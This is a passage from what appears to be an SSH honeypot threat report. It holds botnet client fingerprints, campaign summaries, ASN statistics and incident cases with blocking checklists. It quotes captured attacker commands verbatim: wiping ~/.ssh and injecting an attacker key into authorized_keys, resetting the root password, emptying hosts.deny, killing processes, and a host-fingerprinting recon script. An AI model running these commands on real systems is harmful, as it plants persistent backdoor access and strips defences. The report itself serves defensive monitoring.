| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 185 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 76 | 28 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 47 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 17 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 6 | — |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `bf7dbf67fa9b...` | Go SSH scanner | 4 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **11** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 181 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 26 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:OhFYOuINya4x"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.84.131`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`, `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.60.3.128`, `217.154.38.181`, `175.45.204.121`, `222.232.176.7`, `156.245.246.50`, `107.175.156.152`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **93** |
| Unique ASNs | **55** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 6 | HIGH |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 5 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (345)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9802070034dd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 02:56 |
| **Last Seen** | 2026-07-05 02:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 02:56:26` | `cowrie.session.connect` |
| `2026-07-05 02:56:27` | `cowrie.client.version` |
| `2026-07-05 02:56:27` | `cowrie.client.kex` |
| `2026-07-05 02:56:34` | `cowrie.login.success` |
| `2026-07-05 02:56:37` | `cowrie.session.params` |
| `2026-07-05 02:56:37` | `cowrie.command.input` |
| `2026-07-05 02:56:39` | `cowrie.log.closed` |
| `2026-07-05 02:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8446fb426f25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:04 |
| **Last Seen** | 2026-07-05 03:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:04:42` | `cowrie.session.connect` |
| `2026-07-05 03:04:43` | `cowrie.client.version` |
| `2026-07-05 03:04:43` | `cowrie.client.kex` |
| `2026-07-05 03:04:46` | `cowrie.login.success` |
| `2026-07-05 03:04:47` | `cowrie.session.params` |
| `2026-07-05 03:04:47` | `cowrie.command.input` |
| `2026-07-05 03:04:47` | `cowrie.command.input` |
| `2026-07-05 03:04:47` | `cowrie.command.input` |
| `2026-07-05 03:04:47` | `cowrie.command.input` |
| `2026-07-05 03:04:47` | `cowrie.command.input` |
| `2026-07-05 03:04:47` | `cowrie.command.success` |
| `2026-07-05 03:04:48` | `cowrie.command.input` |
| `2026-07-05 03:04:48` | `cowrie.command.input` |
| `2026-07-05 03:04:48` | `cowrie.command.input` |
| `2026-07-05 03:04:48` | `cowrie.command.input` |
| `2026-07-05 03:04:49` | `cowrie.log.closed` |
| `2026-07-05 03:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c25e19ba4cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:06 |
| **Last Seen** | 2026-07-05 03:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:06:22` | `cowrie.session.connect` |
| `2026-07-05 03:06:23` | `cowrie.client.version` |
| `2026-07-05 03:06:23` | `cowrie.client.kex` |
| `2026-07-05 03:06:25` | `cowrie.login.success` |
| `2026-07-05 03:06:26` | `cowrie.session.params` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.success` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:26` | `cowrie.command.input` |
| `2026-07-05 03:06:27` | `cowrie.log.closed` |
| `2026-07-05 03:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74c814f3f812

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 03:07 |
| **Last Seen** | 2026-07-05 03:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:07:50` | `cowrie.session.connect` |
| `2026-07-05 03:07:52` | `cowrie.client.version` |
| `2026-07-05 03:07:52` | `cowrie.client.kex` |
| `2026-07-05 03:07:58` | `cowrie.login.success` |
| `2026-07-05 03:08:02` | `cowrie.session.params` |
| `2026-07-05 03:08:02` | `cowrie.command.input` |
| `2026-07-05 03:08:03` | `cowrie.log.closed` |
| `2026-07-05 03:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c725341b63

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:08 |
| **Last Seen** | 2026-07-05 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:08:04` | `cowrie.session.connect` |
| `2026-07-05 03:08:04` | `cowrie.client.version` |
| `2026-07-05 03:08:04` | `cowrie.client.kex` |
| `2026-07-05 03:08:07` | `cowrie.login.success` |
| `2026-07-05 03:08:08` | `cowrie.session.params` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.success` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:08` | `cowrie.command.input` |
| `2026-07-05 03:08:09` | `cowrie.log.closed` |
| `2026-07-05 03:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357026798c95

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 03:08 |
| **Last Seen** | 2026-07-05 03:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:08:11` | `cowrie.session.connect` |
| `2026-07-05 03:08:11` | `cowrie.client.version` |
| `2026-07-05 03:08:12` | `cowrie.client.kex` |
| `2026-07-05 03:08:12` | `cowrie.login.success` |
| `2026-07-05 03:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81763e81f1ed

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 03:08 |
| **Last Seen** | 2026-07-05 03:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:08:12` | `cowrie.session.connect` |
| `2026-07-05 03:08:12` | `cowrie.client.version` |
| `2026-07-05 03:08:12` | `cowrie.client.kex` |
| `2026-07-05 03:08:12` | `cowrie.login.success` |
| `2026-07-05 03:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7229c9559cb4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 03:08 |
| **Last Seen** | 2026-07-05 03:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:08:23` | `cowrie.session.connect` |
| `2026-07-05 03:08:23` | `cowrie.client.version` |
| `2026-07-05 03:08:23` | `cowrie.client.kex` |
| `2026-07-05 03:08:23` | `cowrie.login.success` |
| `2026-07-05 03:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-888828a028fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:09 |
| **Last Seen** | 2026-07-05 03:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:09:37` | `cowrie.session.connect` |
| `2026-07-05 03:09:38` | `cowrie.client.version` |
| `2026-07-05 03:09:38` | `cowrie.client.kex` |
| `2026-07-05 03:09:41` | `cowrie.login.success` |
| `2026-07-05 03:09:42` | `cowrie.session.params` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.success` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:42` | `cowrie.command.input` |
| `2026-07-05 03:09:43` | `cowrie.log.closed` |
| `2026-07-05 03:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c57d51b54a7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 03:10 |
| **Last Seen** | 2026-07-05 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:10:46` | `cowrie.session.connect` |
| `2026-07-05 03:10:46` | `cowrie.client.version` |
| `2026-07-05 03:10:46` | `cowrie.client.kex` |
| `2026-07-05 03:10:46` | `cowrie.login.success` |
| `2026-07-05 03:10:47` | `cowrie.session.params` |
| `2026-07-05 03:10:47` | `cowrie.command.input` |
| `2026-07-05 03:10:47` | `cowrie.log.closed` |
| `2026-07-05 03:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e4c0470a23

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:11 |
| **Last Seen** | 2026-07-05 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:11:12` | `cowrie.session.connect` |
| `2026-07-05 03:11:12` | `cowrie.client.version` |
| `2026-07-05 03:11:12` | `cowrie.client.kex` |
| `2026-07-05 03:11:15` | `cowrie.login.success` |
| `2026-07-05 03:11:16` | `cowrie.session.params` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.success` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:16` | `cowrie.command.input` |
| `2026-07-05 03:11:17` | `cowrie.log.closed` |
| `2026-07-05 03:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32868e06d6b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:14 |
| **Last Seen** | 2026-07-05 03:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:14:18` | `cowrie.session.connect` |
| `2026-07-05 03:14:18` | `cowrie.client.version` |
| `2026-07-05 03:14:18` | `cowrie.client.kex` |
| `2026-07-05 03:14:21` | `cowrie.login.success` |
| `2026-07-05 03:14:22` | `cowrie.session.params` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.success` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:22` | `cowrie.command.input` |
| `2026-07-05 03:14:23` | `cowrie.log.closed` |
| `2026-07-05 03:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f24389aa974b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:15 |
| **Last Seen** | 2026-07-05 03:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:15:52` | `cowrie.session.connect` |
| `2026-07-05 03:15:53` | `cowrie.client.version` |
| `2026-07-05 03:15:53` | `cowrie.client.kex` |
| `2026-07-05 03:15:56` | `cowrie.login.success` |
| `2026-07-05 03:15:57` | `cowrie.session.params` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.success` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:57` | `cowrie.command.input` |
| `2026-07-05 03:15:58` | `cowrie.log.closed` |
| `2026-07-05 03:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b504e15d671

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:17 |
| **Last Seen** | 2026-07-05 03:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
